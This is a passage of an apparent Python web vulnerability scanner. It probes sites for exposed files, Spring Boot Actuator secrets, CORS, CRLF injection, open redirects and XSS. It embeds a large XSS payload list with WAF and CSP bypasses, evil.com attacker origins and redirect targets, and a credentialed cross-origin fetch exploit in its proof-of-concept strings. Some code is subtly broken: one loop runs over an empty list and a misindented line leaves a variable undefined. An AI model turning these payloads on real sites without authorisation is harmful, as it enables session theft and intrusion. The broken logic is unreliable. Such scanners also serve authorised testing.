                            f"Sensitive file exposed: {path}",
                            path=path, status=str(status),
                            matched_sigs=matched[:3],
                            preview=body[:300],
                            poc=f"curl '{base+path}'",
                            impact=f"Exposed {path} may contain credentials or sensitive data",
                            remediation="Remove or restrict access immediately.")
                    elif any(x in path.lower() for x in
                             [".zip",".tar",".sql",".gz",".bak",".bz2",
                              ".7z",".rar",".log",".key",".pem"]):
                        return F("expose","high",base+path,
                            f"Backup/sensitive file accessible: {path}",
                            path=path, status=str(status), size=str(content_len),
                            poc=f"wget '{base+path}'",
                            impact="Downloadable backup may expose full application/database",
                            remediation="Remove from web root.")
                    elif default_sev in ("critical","high") and content_len > 0:
                        return F("expose","medium",base+path,
                            f"Potentially sensitive file accessible: {path}",
                            path=path, status=str(status),
                            preview=body[:200],
                            remediation="Review and restrict access.")
                elif default_sev in ("critical","high") and content_len > 0:
                    return F("expose",default_sev,base+path,
                        f"Critical file accessible: {path}",
                        path=path, status=str(status), size=str(content_len),
                        poc=f"curl '{base+path}'",
                        impact="File should not be publicly accessible",
                        remediation="Block access immediately.")
            elif status in (401,403) and default_sev=="critical" and sigs:
                if any(s.lower() in body.lower() for s in sigs):
                    return F("expose","low",base+path,
                        f"Protected sensitive path confirmed: {path}",
                        path=path, status=str(status),
                        remediation="Verify access controls are sufficient.")
        except Exception as e:
            log.debug(f"expose {base+path}: {e}")
        return None

    # Run checks in parallel -- 20 threads per host
    with _TPE(max_workers=30) as exe:
        futs = {exe.submit(_check_path, p): p for p in all_paths}
        for fut in _ac(futs):
            result = fut.result()
            if result:
                with lock:
                    findings.append(result)

    # Phase 2: POST body injection on form endpoints
    post_params = []
    for ep in [][:100]:
        post_params.extend(_discover_post_params(ep))
    for (action, param, _val) in post_params[:80]:
        for payload in XSS_PAYLOADS[:20]:
            r = _post_inject(action, param, payload)
            if not r: continue
            if payload in r[2] or any(sig in r[2] for sig in ["<script>","onerror=","onload="]):
                findings.append(F("xss","high",action,
                    f"Reflected XSS via POST body in param '{param}'",
                    param=param, payload=payload,
                    poc=f"curl -X POST '{action}' -d '{param}={payload}'",
                    impact="Execute arbitrary JavaScript in victim browser via POST endpoint",
                    remediation="HTML-encode all output. Use CSP headers."))
                break
    return findings

# ── 2. SPRING BOOT ACTUATOR (deep) ───────────────────────────────────────────
def check_actuator(url:str) -> List[dict]:
    findings=[]
    base=url.rstrip("/")
    # First check if actuator is exposed at all
    r=_get(base+"/actuator")
    if not r or r[0]!=200: return findings
    # Parse available endpoints from the response
    available=[]
    try:
        d=json.loads(r[2])
        for link in d.get("_links",{}).values():
            href=link.get("href","")
            if href: available.append(href)
    except: pass
    findings.append(F("actuator","high",base+"/actuator",
        "Spring Boot Actuator exposed",
        endpoints=available[:20],preview=r[2][:300]))
    # Check each critical endpoint
    for path,sev in [
        ("/actuator/env","critical"),("/actuator/heapdump","critical"),
        ("/actuator/dump","critical"),("/actuator/jolokia","critical"),
        ("/actuator/restart","critical"),("/actuator/shutdown","critical"),
        ("/actuator/beans","high"),("/actuator/mappings","high"),
        ("/actuator/httptrace","high"),("/actuator/loggers","medium"),
        ("/actuator/metrics","medium"),("/actuator/info","low"),
        ("/actuator/conditions","medium"),("/actuator/configprops","high"),
        ("/actuator/flyway","medium"),("/actuator/liquibase","medium"),
        ("/actuator/scheduledtasks","medium"),("/actuator/sessions","high"),
        ("/actuator/caches","medium"),("/actuator/integrationgraph","medium"),
    ]:
        r=_get(base+path,timeout=8)
        if r and r[0]==200:
            # For env endpoint -- look for passwords
            extra={}
            if path=="/actuator/env" and r[2]:
                pw_hits=[line for line in r[2].splitlines()
                         if any(k in line.lower() for k in ["password","secret","key","token","credential"])]
                if pw_hits: extra["leaked_keys"]=pw_hits[:5]; sev="critical"
            if path=="/actuator/heapdump":
                extra["note"]="Full JVM heap dump downloadable -- contains all passwords/secrets in memory"
            # ── CONFIRMATION: verify endpoint + capture evidence ──
            cap4 = _req_capture(base+path, timeout=8)
            if not cap4 or cap4[0] != 200:
                log.debug(f"[actuator] not reproducible: {base+path}")
                continue
            _, _, _, raw_req_a, raw_resp_a = cap4
            findings.append(F("actuator",sev,base+path,
                f"Actuator endpoint: {path} (confirmed)",
                endpoint=path,preview=r[2][:300],confirmed=True,confidence=95,
                raw_request=raw_req_a,
                raw_response=raw_resp_a[:600],
                **extra))
    return findings

# ── 3. CORS ───────────────────────────────────────────────────────────────────
def check_cors(url:str) -> List[dict]:
    if not url or not isinstance(url, str) or not url.startswith("http"): return []
    findings=[]
    host=urllib.parse.urlparse(url).netloc
    origins=[
        "https://evil.com",
        f"https://{host}.evil.com",
        f"https://evil.com.{host}",
        "null",
        f"https://not{host}",
        f"http://{host}",
        f"https://{host}@evil.com",
        f"https://{host}_.evil.com",
        f"https://{host}%60.evil.com",
        "https://evil.com#" + host,
    ]
    for origin in origins:
        r=_get(url,headers={"Origin":origin},timeout=6)
        if not r: continue
        acao=r[1].get("Access-Control-Allow-Origin","")
        acac=r[1].get("Access-Control-Allow-Credentials","").lower()
        acah=r[1].get("Access-Control-Allow-Headers","")
        acam=r[1].get("Access-Control-Allow-Methods","")
        if acao==origin or (acao=="*" and acac=="true"):
            # ── CONFIRMATION: send second request, capture evidence ──
            cap = _req_capture(url, headers={"Origin":origin}, timeout=6)
            if not cap: continue
            _, _, _, raw_req2, raw_resp2 = cap
            acao2 = cap[1].get("Access-Control-Allow-Origin","")
            if acao2 != acao:
                log.debug(f"[cors] inconsistent — skipping {url}")
                continue
            sev="critical" if acac=="true" else "high"
            poc=(f"# CORS Vulnerability Confirmed (2/2 requests)\n"
                 f"curl -H 'Origin: {origin}' -I '{url}'\n"
                 f"# Access-Control-Allow-Origin: {acao}\n"
                 f"# Access-Control-Allow-Credentials: {acac}\n"
                 f"# JS Exploit:\n"
                 f"fetch('{url}',{{credentials:'include',headers:{{Origin:'{origin}'}}}}).then(r=>r.text()).then(console.log)")
            findings.append(F("cors",sev,url,
                "CORS arbitrary origin reflected (confirmed)",
                origin_tested=origin,ACAO=acao,ACAC=acac,ACAH=acah,ACAM=acam,
                confirmed=True,confidence=95,
                poc=poc,
                raw_request=raw_req2,
                raw_response=raw_resp2[:600],
                impact="Attacker can read authenticated responses cross-origin" if acac=="true" else "CORS misconfiguration",
                remediation="Validate Origin against an explicit whitelist. Never reflect arbitrary origins."))
            break
    return findings

# ── 4. CRLF INJECTION ────────────────────────────────────────────────────────
def check_crlf(url:str) -> List[dict]:
    if not url or not isinstance(url, str) or not url.startswith("http"):
        return []
    findings=[]
    CANARY = "bugscan-crlf-" + str(int(time.time()))[-6:]
    payloads=[
        f"%0d%0aX-Injected:{CANARY}",
        f"%0aX-Injected:{CANARY}",
        f"%0d%0a%20X-Injected:{CANARY}",
        f"%0d%0aSet-Cookie:crlf={CANARY};Domain=evil.com",
        f"\r\nX-Injected:{CANARY}",
        f"%E5%98%8D%E5%98%8AX-Injected:{CANARY}",
        f"%u000dX-Injected:{CANARY}",
        # Header splitting
        f"%0d%0aLocation:https://evil.com%0d%0a",
        f"%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
        # Unicode bypasses
        f"%C0%8AX-Injected:{CANARY}",
        f"%C4%8DX-Injected:{CANARY}",
        # Double encoding
        f"%250d%250aX-Injected:{CANARY}",
        f"%25%30%64%25%30%61X-Injected:{CANARY}",
    ]
    for payload in payloads:
        r=_get(url+"/"+payload)
        if not r: continue
        hdrs=str(r[1])
        hdrs_str = str(r[1])
        if CANARY in hdrs_str or "X-Injected" in hdrs_str or "crlf=injected" in hdrs_str:
            # ── CONFIRMATION: repeat with different canary + capture evidence ──
            canary2 = "bugscan-confirm-" + str(int(time.time()))[-5:]
            confirm_payload = payload.replace(CANARY, canary2)
            cap3 = _req_capture(url+"/"+confirm_payload)
            if not cap3:
                continue
            _, _, _, raw_req_c, raw_resp_c = cap3
            hdrs2 = str(cap3[1])
            if canary2 not in hdrs2 and "X-Injected" not in hdrs2:
                log.debug(f"[crlf] not reproducible — skipping {url}")
                continue
            findings.append(F("crlf","high",url,
                "CRLF injection — header injection confirmed (2/2)",
                payload=payload,
                confirmed=True,confidence=95,
                raw_request=raw_req_c,
                raw_response=raw_resp_c[:600],
                poc=f"# CRLF Injection Confirmed\ncurl -v '{url}/{payload}'\n# Injected: X-Injected: {CANARY}",
                impact="Header injection: can set cookies, redirect users, split HTTP responses",
                remediation="Sanitize CR (\r) and LF (\n) characters from all user input before using in HTTP response headers."))
            break
    return findings

# ── 5. OPEN REDIRECT ─────────────────────────────────────────────────────────
REDIRECT_PARAMS=["url","redirect","redirect_uri","next","return","return_to",
                 "goto","target","redir","destination","location","continue",
                 "forward","out","link","callback","r","u","to","ref","uri",
                 "path","redirect_to","returnUrl","returnURL","RelayState",
                 "next_page","success_url","cancel_url","after_sign_in_url",
                 "post_logout_redirect_uri","homepage","back","from","fromURI"]

REDIRECT_PAYLOADS=[
    "https://evil.com","//evil.com",
    "https://evil.com%2F","https:%2F%2Fevil.com",
    "/%09/evil.com","/%2F%2Fevil.com",
    "/\\evil.com","//evil.com%23",
    "javascript:alert(1)","data:text/html,<h1>Redirect</h1>",
]

def _build_redirect_payloads() -> list:
    """Build redirect payload list, prepending payload_intel ranked variants."""
    base = list(REDIRECT_PAYLOADS)
    try:
        from engine.payload_intel import select_payloads as _pi_r
        _pi_redir = [p for p in _pi_r("redirect", transport="query", top_n=6)
                     if p not in base[:4]]
        if _pi_redir:
            base = _pi_redir + base
            import logging as _lg
            _lg.getLogger("bugscan.elite").info(
                f"[redirect] payload_intel: {len(_pi_redir)} ranked payloads prepended")
    except Exception:
        pass
    return base

def check_redirect(endpoints:List[str]) -> List[dict]:
    findings=[]
    tested=set()
    for ep in endpoints[:500]:
        if "=" not in ep: continue
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in REDIRECT_PARAMS:
            if param not in qs: continue
            if ep in tested: break
            tested.add(ep)
            # Merge: payload_manager (Assetnote/PAT) + _build_redirect_payloads constants
            if not getattr(_tl, '_redir_merged', None):
                _redir_const = _build_redirect_payloads()
                _tl._redir_merged = _build_merged_payloads(
                    "redirect", _redir_const, limit=15
                )
            _redir_pl = _tl._redir_merged
            for payload in _redir_pl[:8]:
                nq=dict(qs); nq[param]=[payload]
                test=urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq,doseq=True)))
                r=_get(test,timeout=6)
                if not r: continue
                status,hdrs,body=r
                loc=hdrs.get("Location","")
                if "evil.com" in loc or ("evil" in loc and status in (301,302,303,307,308)):
                    # ── CONFIRMATION: verify redirect + capture evidence ──
                    cap2 = _req_capture(test, timeout=6)
                    if not cap2: continue
                    loc2 = cap2[1].get("Location","")
                    if "evil.com" not in loc2 and "evil" not in loc2:
                        log.debug(f"[redirect] inconsistent — skipping {ep}")
                        continue
                    _, _, _, raw_req_r, raw_resp_r = cap2
                    findings.append(F("redirect","high",ep,
                        f"Open redirect via '{param}' (confirmed)",
                        param=param,payload=payload,
                        location=loc,status=str(status),
                        confirmed=True,confidence=95,
                        raw_request=raw_req_r,
                        raw_response=raw_resp_r[:600],
                        poc=f"# Open Redirect — Confirmed (2/2 requests)\ncurl -I '{test}'\n# Location: {loc}",
                        impact="Phishing, credential theft, OAuth token leakage via redirect after login",
                        remediation="Validate redirect URLs against a strict whitelist of allowed domains."))
                    break
    return findings

# ── 6. XSS ───────────────────────────────────────────────────────────────────

XSS_PAYLOADS=[
    # ── Basic script injection ────────────────────────────────────────────────
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    # ── Attribute injection ───────────────────────────────────────────────────
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\">'><script>alert(1)</script>",
    # ── SVG (most reliable WAF bypass) ───────────────────────────────────────
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(document.domain)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg onUnload=\"javascript:alert(1)\"></svg>",
    "<svg/onload=\\u0061lert(1)>",
    "<svg onload=%26%23097;lert(1)>",
    # ── IMG event handlers ────────────────────────────────────────────────────
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img/src=x onerror=alert(1)>",
    "<IMG SRC=x ONERROR=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img SRC=\"javascript:alert(1)\">",
    "<img src=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\">",
    "<img src=x onpopstate=\"alert(String.fromCharCode(88,83,83))\">",
    "<img src=\"x\" onerror=\"&#x61;lert(1)\">",
    "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
    # ── Body/window handlers ──────────────────────────────────────────────────
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<BODY ONLOAD=alert('XSS')>",
    "<html onMouseUp=\"javascript:alert(1)\"></html>",
    # ── Form/input ────────────────────────────────────────────────────────────
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<input type=\"image\" src=\"javascript:alert(1)\">",
    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(1)\">",
    "<keygen autofocus onfocus=alert(1)>",
    "<button onclick=alert(1)>X",
    # ── Details/video/audio ───────────────────────────────────────────────────
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video onerror=\"javascript:alert(1)\"><source>",
    # ── Handlers on var/div ───────────────────────────────────────────────────
    "<var onmouseover=\"prompt(1)\">test</var>",
    "<div style=\"width:1px;height:1px;background:url(javascript:alert(1))\">",
    "<DIV STYLE=\"width:expression(javascript:alert(1))\">",
    # ── JavaScript protocol ───────────────────────────────────────────────────
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "<a href=\"javascript:alert(1)\">X</a>",
    "<a href=\"javascript:\x09:alert(1)\">test</a>",
    "<a href=\"\x0Djavascript:alert(1)\">test</a>",
    "<a href=\"\xC2\xA0javascript:alert(1)\">test</a>",
    # ── iframe ────────────────────────────────────────────────────────────────
    "<iframe src=javascript:alert(1)>",
    "<IFRAME SRC=\"javascript:alert(1)\"></iframe>",
    "<iframe onbeforeload=\"javascript:alert(1)\"></iframe>",
    # ── Template/expression injection ─────────────────────────────────────────
    "{{7*7}}",
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "#{7*7}",
    "*{7*7}",
    # ── Encoding bypasses ─────────────────────────────────────────────────────
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    "<svg onload=alert&#40;1&#41;>",
    # ── WAF bypass tricks ─────────────────────────────────────────────────────
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x one\rror=alert(1)>",
    "<img src=x one\nrror=alert(1)>",
    "<img\tsrc=x\tonerror=alert(1)>",
    "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
    "</TITLE><SCRIPT>alert(\"XSS\")</SCRIPT>",
    "\"><img src=x onerror=alert(document.cookie)>",
    "<script\x20type=\"text/javascript\">alert(1);</script>",
    "ABC<div style=\"x:\xE2\x80\x89expression(javascript:alert(1))\">DEF",
    # ── DOM-based (from xssFuzz/findom) ──────────────────────────────────────
    "'><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7 onerror=eval(atob(this.id))>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=(alert)(1)>",
    # ── Style-based ───────────────────────────────────────────────────────────
    "<style/onload=prompt('XSS')>",
    "<style>@im\\port'\\ja\\vasc\\ript:alert(1)';</style>",
    # ── H1-trained polyglots (high-bounty patterns) ───────────────────────────
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//",
    "'>\"<img src=x onerror=\"confirm(1)\">",
    "</script><svg/onload=alert(document.domain)//",
    "'><svg/onload=alert(document.cookie)>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>",
    "%22><svg/onload=alert(1337)>",
    "\";alert(1)//",
    "';alert(1)//",
    "-alert(1)/",
    # ── xsscon-style level payloads ───────────────────────────────────────────
    "\"><svg/onload=confirm(1)>",
    "\"onmouseover=\"alert(1)",
    "';alert(String.fromCharCode(88,83,83))//",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
    # ── XSStrike-style context-aware ──────────────────────────────────────────
    "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
    "<!--<img src=--><img src=x onerror=alert(1)//>",
    "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">",
]

# Add powerful new bypasses to existing XSS_PAYLOADS
_XSS_EXTRA = [
    # CSP bypass via JSONP
    "<script src=//accounts.google.com/o/oauth2/revoke?callback=alert(1)></script>",
    # Script gadget bypass (Angular)
    "<div ng-app ng-csp><input autofocus ng-focus=d=$event.view.document;d.location.hash.match(d.cookie)></div>",
    # SVG with animate
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    # Template literal injection
    "`${alert(1)}`",
    # mXSS
    "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
    # noscript XSS
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    # Expression language
    "${7*7}",
    # Iframe srcdoc
    "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>",
    # Object data
    "<object data='data:text/html,<script>alert(1)</script>'>",
    # Mutation XSS in attribute
    "<form><button formaction=javascript:alert(1)>click",
    # Meta refresh
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    # Base href bypass
    "<base href=//evil.com/><script src=x.js></script>",
    # CSS expression (IE)
    "<div style=color:expression(alert(1))>",
    # Autofocus without script
    "<input autofocus onfocus=alert(1)>",
    # draggable
    "<p draggable ondragstart=alert(1)>drag me",
    # popstate
    "<body onpopstate=alert(1)><a href=#>click",
]
XSS_PAYLOADS = list(XSS_PAYLOADS) + _XSS_EXTRA


# ── Payload merge helper — used by ALL check_* functions ─────────────────────
# Priority: payload_intel (ranked/DB) → payload_manager (Assetnote+PAT) → constants
# Deduplicates while preserving order. Caps at limit.
def _build_merged_payloads(
    bug_type:  str,
    constants: list,
    param:     str   = "",
    limit:     int   = 30,
    deep:      bool  = False,
    url:       str   = "",
) -> list:
    """
    Payload Intelligence v2 — unified merge via select_payloads_v2().

    Priority: payload_intel (ranked/DB/feedback) → payload_manager
              (Assetnote+PAT, context-routed) → existing constants
    Deduplicates while preserving order. Caps at limit (max 100 deep).

    Logs:
      [payload-v2] bug=sqli param=id selected=30 sources=... mode=normal
    """
    mode = "deep" if deep else "normal"
    cap  = min(limit, 100) if deep else limit

    # ── v2 structured selection ───────────────────────────────────────────────
    seen:   set  = set()
    result: list = []

    try:
        from engine.payload_manager import select_payloads_v2 as _v2
        waf_ctx = {}
        try:
            w = _tl_waf()
            if w.get("detected"):
                waf_ctx["waf_detected"] = True
        except Exception:
            pass

        v2_objects = _v2(bug_type, url=url, param=param,
                         context=waf_ctx, mode=mode)

        for obj in v2_objects:
            raw = obj["payload"]
            item = (raw, []) if constants and isinstance(constants[0], tuple) else raw
            key  = raw if isinstance(raw, str) else raw[0]
            if key not in seen:
                seen.add(key)
                result.append(item)
            if len(result) >= cap:
                break

    except Exception as _v2e:
        log.debug(f"[payload-v2] select_payloads_v2 failed: {_v2e}")

    # ── Fill remaining slots from constants ───────────────────────────────────
    _before = len(result)
    for p in constants:
        key = p[0] if isinstance(p, tuple) else p
        if key not in seen:
            seen.add(key)
            result.append(p)
        if len(result) >= cap:
            break
    _const_n = len(result) - _before

    result = result[:cap]

    # Resolve source breakdown from v2 objects for logging
    if 'v2_objects' in dir():
        _src_counts: Dict = {}
        for obj in v2_objects[:len(result)]:
            s = obj.get("source","constant").split("+")[0]
            _src_counts[s] = _src_counts.get(s,0) + 1
        _src_counts["constants"] = _const_n
        _sources = "+".join(k for k,v in _src_counts.items() if v > 0)
    else:
        _sources = "constants"

    log.info(
        f"[payload-v2] bug={bug_type} param={param or 'any'}"
        f" selected={len(result)} sources={_sources} mode={mode}"
    )
    return result



# ── POST body injection helper ─────────────────────────────────────────────────
def _post_inject(url: str, param: str, payload: str, 
                 content_type: str = "application/x-www-form-urlencoded") -> tuple:
    """
    Test a payload via POST body.
    Tries both form-encoded and JSON body injection.
    Returns (status, headers, body) or None.
    """
    # Form-encoded
    data = urllib.parse.urlencode({param: payload}).encode()
    r = _req(url, "POST", headers={"Content-Type": content_type}, data=data, timeout=8)
    if r: return r
    return None


def _discover_post_params(url: str) -> list:
    """Discover POST form parameters from a page."""
    results = []
    try:
        r = _get(url, timeout=8)
        if not r or "text/html" not in r[1].get("Content-Type",""): return results
        body = r[2]
        for form_m in re.finditer(r"<form[^>]*>(.*?)</form>", body, re.S | re.I):
            form_html = form_m.group(0)
            act_m  = re.search(r"action=[^\s>]+", form_html, re.I)
            action = url
            if act_m:
                raw_act = act_m.group(0).split("=",1)[1].strip('"\' ')
                action  = urllib.parse.urljoin(url, raw_act)
            meth_m = re.search(r"method=[^\s>]+", form_html, re.I)
            if meth_m:
                meth = meth_m.group(0).split("=",1)[1].strip('"\' ').upper()
                if meth != "POST": continue
            for inp in re.finditer(r"<input[^>]+>", form_html, re.I):
                tag = inp.group(0)
                nm  = re.search(r"name=[^\s>]+", tag, re.I)
                if nm:
                    fname = nm.group(0).split("=",1)[1].strip('"\' ')
                    if fname and fname.lower() not in ("csrf_token","_token","submit","button"):
                        results.append((action, fname, ""))
            for ta in re.finditer(r"<textarea[^>]+>", form_html, re.I):
                tag = ta.group(0)
                nm  = re.search(r"name=[^\s>]+", tag, re.I)
                if nm:
                    results.append((action, nm.group(0).split("=",1)[1].strip('"\' '), ""))
    except: pass
    return results


def _xss_detect_chars(ep: str) -> dict:
    """xssFuzz approach: test which dangerous chars reflect without encoding."""
    reflected = []
    probe = "\"><randomxss"
    try:
        parsed = urllib.parse.urlparse(ep)
        qs = urllib.parse.parse_qs(parsed.query)
        if not qs: return {}
        param = list(qs.keys())[0]
        nq = dict(qs); nq[param] = [probe]
        test = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(nq, doseq=True)))
        r = _get(test, timeout=6)
        if not r: return {}
        body = r[2]
        for ch in DANGER_CHARS:
            if ch in body: reflected.append(ch)
        return {"url": ep, "param": param, "reflected": reflected,
                "injectable": len(reflected) >= 3}
    except: return {}


def _load_xss_custom_payloads() -> List[str]:
    """Load 2789 custom XSS payloads from uploaded xss_custom_payloads.txt."""
    import os as _os
    paths = [
        _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "payloads", "xss_custom_payloads.txt"),
        _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "payloads", "xss.txt"),
    ]
    for p in paths:
        if _os.path.isfile(p):
            try:
                with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                    pl = [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
                log.info(f"[xss] loaded {len(pl)} custom payloads from {_os.path.basename(p)}")
                return pl
            except: pass
    return []


def _load_xss_wordlist() -> List[str]:
    """Load SecLists XSS wordlist if available."""
    import os as _os
    paths = [
        "/usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt",
        "/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt",
        "/usr/share/seclists/Fuzzing/XSS/XSS-RSNAKE.txt",
        _os.path.expanduser("~/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt"),
    ]
    for p in paths:
        if _os.path.isfile(p):
            try:
                with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                    return [l.strip() for l in f if l.strip()][:1000]
            except: pass
    return []


def check_dom_xss(endpoints: List[str], targets: List[str]) -> List[dict]:
    """
    DOM XSS detection -- findom-xss.sh approach.
    Scans page source for DOM sources feeding into DOM sinks.
    """
    findings = []
    tested = set()

    for url in (targets + endpoints)[:120]:
        if url in tested: continue
        tested.add(url)
        try:
            r = _get(url, timeout=8)
            if not r or r[0] != 200: continue
            body = r[2]
            if 'text/html' not in r[1].get('Content-Type', '') and \
               'javascript' not in r[1].get('Content-Type', ''): continue

            sources_found, sinks_found = [], []
            for pat in DOM_SOURCE_PATTERNS:
                if re.search(pat, body, re.I):
                    sources_found.append(pat.replace(r'\.', '.').replace(r'\b', ''))
            for pat in DOM_SINK_PATTERNS:
                if re.search(pat, body, re.I):
                    sinks_found.append(pat.replace(r'\.', '.').replace(r'\(', '(').replace(r'\s*=', '='))

            if sources_found and sinks_found:
                high_risk_sinks = ['innerHTML', 'document.write', 'eval(', 'setTimeout(', 'Function(']
                sev = 'high' if any(s in sinks_found for s in high_risk_sinks) else 'medium'
                findings.append(F('xss', sev, url,
                    f"DOM XSS: {sources_found[0]} → {sinks_found[0]}",
                    sources=sources_found[:4], sinks=sinks_found[:4],
                    poc=(f"# DOM source feeds sink without sanitization\n"
                         f"# Source: {sources_found[0]}\n"
                         f"# Sink: {sinks_found[0]}\n"
                         f"# Test: {url}#<img src=x onerror=alert(1)>\n"
                         f"# Or:  {url}?q=<img src=x onerror=alert(1)>"),
                    impact="DOM XSS executes in victim browser without server-side reflection",
                    remediation="Use textContent not innerHTML. Sanitize DOM sources before passing to sinks. Use DOMPurify."))
        except Exception as e:
            log.debug(f"dom_xss {url}: {e}")
    return findings


def _run_dalfox(endpoints: List[str], targets: List[str]) -> List[dict]:
    """
    dalfox (https://github.com/hahwul/dalfox) -- deep XSS engine.
    Install: go install github.com/hahwul/dalfox/v2@latest
    Handles: parameter analysis, DOM, blind XSS, WAF bypass, JSON params.
    """
    import os as _os, subprocess as _sp, tempfile as _tf
    findings = []

    # Find dalfox binary
    dalfox = None
    for p in ['/home/kali/go/bin/dalfox', '/root/go/bin/dalfox',
              '/usr/local/bin/dalfox', '/usr/bin/dalfox',
              _os.path.expanduser('~/go/bin/dalfox')]:
        if _os.path.isfile(p):
            dalfox = p; break
    if not dalfox:
        try:
            import shutil
            dalfox = shutil.which('dalfox')
        except: pass
    if not dalfox:
        log.info("[dalfox] not installed -- run: go install github.com/hahwul/dalfox/v2@latest")
        return findings

        param_eps = [e for e in endpoints if '=' in e and urllib.parse.urlparse(e).netloc][:40]
    if not param_eps:
        return findings

    try:
        tmp = _tf.mktemp(suffix='.txt')
        with open(tmp, 'w') as tf:
            for t in param_eps:
                tf.write(t + '\n')

        # Check dalfox version flags
        try:
            _dfhelp = _sp.run([dalfox, '--help'], capture_output=True, text=True, timeout=5)
            _dfhelp_text = _dfhelp.stdout + _dfhelp.stderr
            _has_silence    = '--silence' in _dfhelp_text
            _has_waf_bypass = '--waf-bypass' in _dfhelp_text or '--waf-evasion' in _dfhelp_text
            _waf_flag       = '--waf-bypass' if '--waf-bypass' in _dfhelp_text else '--waf-evasion' if '--waf-evasion' in _dfhelp_text else None
        except Exception:
            _has_silence = True; _waf_flag = None

        cmd = [dalfox, 'file', tmp,
               '--no-color',
               '--output-format', 'json',
               '--timeout', '10',
               '--worker', '5',
               '--follow-redirects',
        ]
        if _has_silence:
            cmd.append('--silence')
        if _waf_flag:
            cmd.append(_waf_flag)
        log.info(f"[dalfox] scanning {len(param_eps)} endpoints")
        proc = _sp.run(cmd, capture_output=True, text=True, timeout=180)

        # Filter out help text, version lines, and non-finding output
        _HELP_KEYWORDS = ['--found-action', 'Example:', 'Usage:', 'Flags:', 'Available',
                           'Execute a command', 'Specify the shell', '-h, --help', 'version',
                           'dalfox v', 'github.com/hahwul', 'Usage of', 'Global Flags:']
        for line in (proc.stdout + proc.stderr).splitlines():
            line = line.strip()
            if not line: continue
            # Skip help text and usage lines
            if any(kw in line for kw in _HELP_KEYWORDS): continue
            try:
                d = json.loads(line)
                if d.get('type') in ('POC', 'INJECT', 'FOUND', 'WEAK') or d.get('vulnerable'):
                    url   = d.get('data', d.get('url', param_eps[0]))
                    poc   = d.get('poc', d.get('evidence', ''))
                    param = d.get('param', d.get('parameter', ''))
                    findings.append(F('xss', 'high', url,
                        f"dalfox: XSS in '{param or 'parameter'}'",
                        param=param, payload=d.get('payload', '')[:100],
                        poc=poc[:300] if poc else f"dalfox confirmed {url}",
                        tool='dalfox',
                        impact="XSS confirmed by dalfox — session hijacking, account takeover possible",
                        remediation="Encode all output. Implement strict Content-Security-Policy."))
            except json.JSONDecodeError:
                # Only accept genuine finding lines, not help text
                if any(x in line for x in ['[VULN]', '[POC]', 'XSS Found', 'Reflected XSS']):
                    if not any(kw in line for kw in _HELP_KEYWORDS):
                        findings.append(F('xss', 'high', param_eps[0],
                            f"dalfox: {line[:120]}",
                            tool='dalfox', raw=line[:200],
                            impact="XSS detected by dalfox",
                            remediation="Encode all output. Implement Content-Security-Policy."))
        try: _os.unlink(tmp)
        except: pass
        log.info(f"[dalfox] {len(findings)} findings")
    except FileNotFoundError:
        log.info("[dalfox] binary not found")
    except Exception as e:
        log.debug(f"[dalfox] {e}")
    return findings


def _run_headless_xss(url: str, payloads: List[str], param: str = '') -> List[dict]:
    """
    Headless Chrome/Chromium XSS verification.
    Confirms JS actually executes -- not just string reflection.
    Technique from xssFuzz's validate_js_alert approach.
    """
